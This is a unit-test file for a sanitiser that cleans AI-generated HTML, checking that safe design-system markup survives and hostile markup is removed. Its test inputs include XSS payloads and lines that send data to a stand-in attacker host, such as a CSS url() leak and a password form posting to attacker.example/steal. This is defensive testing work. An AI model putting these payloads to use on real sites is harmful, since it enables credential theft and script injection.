// Unit tests for src/lib/sanitizeHtml.ts (policy for model-generated HTML).
import { describe, it, expect } from 'vitest'
import { sanitizeHtml } from '../sanitizeHtml'

// Parse the sanitised output without executing anything.
function dom(html: string) {
  return new DOMParser().parseFromString(sanitizeHtml(html), 'text/html').body
}

describe('sanitizeHtml', () => {
  it('keeps the design-system markup previews rely on', () => {
    const el = dom('<div class="card" aria-label="Card"><button class="btn btn-primary" type="button">Save</button><table><tr><td style="text-align:right">1</td></tr></table></div>')
    expect(el.querySelector('.card')?.getAttribute('aria-label')).toBe('Card')
    expect(el.querySelector('button.btn.btn-primary')?.textContent).toBe('Save')
    expect(el.querySelector('td')?.getAttribute('style')).toBe('text-align:right')
  })

  it('keeps layout styles but drops positioning that could cover the page', () => {
    const el = dom('<div style="display: flex; gap: 8px; position: fixed; inset: 0; z-index: 9999; top: 0">x</div>')
    expect(el.firstElementChild?.getAttribute('style')).toBe('display: flex; gap: 8px')
  })

  it('drops styles that load remote resources', () => {
    const el = dom('<div style="background: url(https://attacker.example/?leak=1); color: red">x</div>')
    expect(el.firstElementChild?.getAttribute('style')).toBe('color: red')
  })

  it('removes the style attribute entirely when nothing safe is left', () => {
    const el = dom('<div style="position: absolute">x</div>')
    expect(el.firstElementChild?.hasAttribute('style')).toBe(false)
  })

  it('removes <style> blocks that would restyle the whole page', () => {
    expect(dom('<style>body{display:none}</style><p>hi</p>').querySelector('style')).toBeNull()
  })

  it('unwraps forms so nothing can be submitted, keeping their fields visible', () => {
    const el = dom('<form action="https://attacker.example/steal"><input name="password"><button>Sign in</button></form>')
    expect(el.querySelector('form')).toBeNull()
    expect(el.querySelector('input')).not.toBeNull()
    expect(el.querySelector('[formaction], [action]')).toBeNull()
  })

  it('opens external links in a new tab without an opener', () => {
    const a = dom('<a href="https://example.com">x</a>').querySelector('a')!
    expect(a.getAttribute('target')).toBe('_blank')
    expect(a.getAttribute('rel')).toBe('noopener noreferrer')
  })

  it('leaves in-page anchors alone', () => {
    const a = dom('<a href="#section">x</a>').querySelector('a')!
    expect(a.hasAttribute('target')).toBe(false)
  })

  it('loads images lazily without sending a referrer', () => {
    const img = dom('<img src="https://example.com/a.png" alt="A">').querySelector('img')!
    expect(img.getAttribute('referrerpolicy')).toBe('no-referrer')
    expect(img.getAttribute('loading')).toBe('lazy')
  })

  it.each([
    ['<img src=x onerror="alert(1)">', '[onerror]'],
    ['<svg onload="alert(1)"><circle r="1"/></svg>', '[onload]'],
    ['<a href="javascript:alert(1)">x</a>', 'a[href^="javascript"]'],
    ['<iframe src="https://attacker.example"></iframe>', 'iframe'],
    ['<script>alert(1)</script>', 'script'],
    ['<object data="x.swf"></object>', 'object'],
  ])('strips %s', (html, selector) => {
    expect(dom(html).querySelector(selector)).toBeNull()
  })
})
